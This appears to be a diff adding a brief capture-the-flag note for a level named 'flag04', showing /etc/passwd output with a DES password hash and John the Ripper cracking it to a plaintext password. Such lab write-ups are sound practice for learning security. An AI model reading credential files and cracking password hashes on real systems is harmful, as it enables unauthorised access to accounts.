@@ -1,0 +1,13 @@
+cat /etc/passwd
+
+...
+flag04:42hDRfypTqqnw:3004:3004::/home/flag/flag04:/bin/bash
+...
+
+# using john the ripper
+
+john passwd
+
+Loaded 1 password hash (descrypt, traditional crypt(3) [DES 64/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+abcdefg          (flag04)
